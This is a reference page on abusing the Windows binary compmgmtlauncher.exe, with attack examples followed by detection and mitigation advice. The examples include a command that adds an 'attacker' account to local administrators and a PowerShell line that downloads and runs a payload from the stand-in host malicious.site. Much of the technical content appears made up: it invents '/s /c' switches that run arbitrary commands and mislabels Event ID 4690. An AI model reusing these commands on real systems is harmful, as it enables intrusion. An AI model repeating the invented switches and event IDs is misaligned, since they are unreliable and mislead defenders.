# compmgmtlauncher.exe
## What is it?
*```compmgmtlauncher.exe``` is a Windows system executable that opens the **Computer Management** console, a built-in administrative tool used for managing local and remote computers.*

*It is typically used to access various system tools, such as Disk Management, Event Viewer, Device Manager, and Local Users and Groups, to perform system maintenance and troubleshooting.*

*Despite being a trusted system process, ```compmgmtlauncher.exe``` can be exploited by attackers to gain unauthorized access to critical system tools, leveraging the trusted nature of the executable.*

## Legitimate Usage
- **System Administration** → Provides access to the Computer Management console for system administrators to manage system settings.
- **Disk Management** → Used to create, delete, and resize partitions or manage storage devices.
- **Event Viewer** → Access to logs for system and application events.
- **Local User Management** → Administers local user accounts and groups for security management.
- **Remote Management** → Provides administrators the ability to manage remote systems using the same tools as on a local machine.

## How to abuse it
- **Evasion via Trusted Tool** → Since ```compmgmtlauncher.exe``` is a trusted Windows binary, attackers can use it to launch other malicious processes or tools without raising suspicion.
- **Access Critical System Tools** → Attackers can gain access to powerful system tools such as Device Manager or Local Users and Groups, which could lead to privilege escalation or manipulation of user accounts.
- **Privilege Escalation** → Attackers could exploit vulnerabilities in the Computer Management tools to escalate privileges, such as adding their user account to the local administrators group.
- **Lateral Movement** → Using ```compmgmtlauncher.exe``` to connect to remote systems could allow attackers to execute arbitrary commands on those systems.

## Example attacks
### 1. Accessing Local Users and Groups for Privilege Escalation
*Attackers can use ```compmgmtlauncher.exe``` to add their user account to the local administrators group, granting themselves elevated privileges.*

**Add Attacker to Local Administrators Group**

```
compmgmtlauncher.exe /s /c "net localgroup administrators attacker /add"
```

**Effect:**
- The attacker’s account is added to the **Local Administrators group**, providing them with elevated privileges on the machine.

### 2. Evasion via Trusted Process
*Attackers can use ```compmgmtlauncher.exe``` to execute malicious code or tools, as it is a trusted process often overlooked by security tools.*

**Run Malicious Code Through Compmgmtlauncher**

```
compmgmtlauncher.exe /s /c "powershell -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
```

**Effect:**
- Executes a PowerShell command to download and execute a malicious payload, evading detection by using a trusted system executable.

### 3. Accessing Remote Systems for Lateral Movement
*Attackers can use ```compmgmtlauncher.exe``` to remotely manage other systems, potentially installing backdoors or exfiltrating data.*

**Connect to Remote System via Computer Management**

```
compmgmtlauncher.exe /computer:\192.168.1.50
```

**Effect:**
- The attacker connects to a remote system using the **Computer Management** tool, which could allow them to execute commands or access critical system tools remotely.

### 4. Leveraging Device Manager for Lateral Movement or Data Exfiltration
*Using ```compmgmtlauncher.exe```, attackers can manipulate devices, disable security tools, or install malicious drivers for further exploitation.*

**Disable Security Tools via Device Manager**

```
compmgmtlauncher.exe /s /c "devmgmt.msc"
```

**Effect:**
- Launches **Device Manager** to disable security software or manipulate hardware components, potentially evading detection or controlling critical devices on the system.

### 5. Exploiting System Logs for Data Exfiltration
*Attackers may use ```compmgmtlauncher.exe``` to open **Event Viewer** and exfiltrate event logs or look for sensitive data.*

**Access Event Logs for Sensitive Information**

```
compmgmtlauncher.exe /s /c "eventvwr.msc"
```

**Effect:**
- Accesses **Event Viewer** to search for sensitive information or logs related to user activity, system operations, or application events.

# Detection & Mitigation
## Detection Methods
**Monitor for Unusual Executions of compmgmtlauncher.exe**
- **Event ID 4688 (Process Creation)** → Track the creation of ```compmgmtlauncher.exe``` processes, particularly those running commands or arguments that are not typical for system administration.
- **Behavioral Analysis** → Look for unusual or unexpected interactions with system tools, such as opening Device Manager or User Groups through ```compmgmtlauncher.exe```.

**Monitor Access to Critical System Tools**
- **Event ID 4690 (Scheduled Task Started)** → Track when ```compmgmtlauncher.exe``` is used to open sensitive system tools such as Event Viewer or Device Manager.
- **Event ID 4672 (Special Privileges Assigned to New Logon)** → Detect when elevated privileges are granted via tools launched by ```compmgmtlauncher.exe```.

**Monitor Remote Connections**
- **Event ID 5140 (SMB Share Access)** → Track the use of ```compmgmtlauncher.exe``` to connect to remote systems for lateral movement.

## Mitigation Strategies
- **Restrict Access to Computer Management** → Limit the use of ```compmgmtlauncher.exe``` to trusted administrators through application whitelisting tools like AppLocker or WDAC.
- **Use Endpoint Protection** → Ensure endpoint protection software is monitoring for suspicious use of trusted system tools like ```compmgmtlauncher.exe```.
- **Audit Access to Critical System Tools** → Regularly audit the use of administrative tools such as Device Manager, Event Viewer, and Local Users and Groups to detect misuse.
- **Limit Remote Access** → Restrict remote management access to trusted IP addresses or administrative accounts to prevent lateral movement.
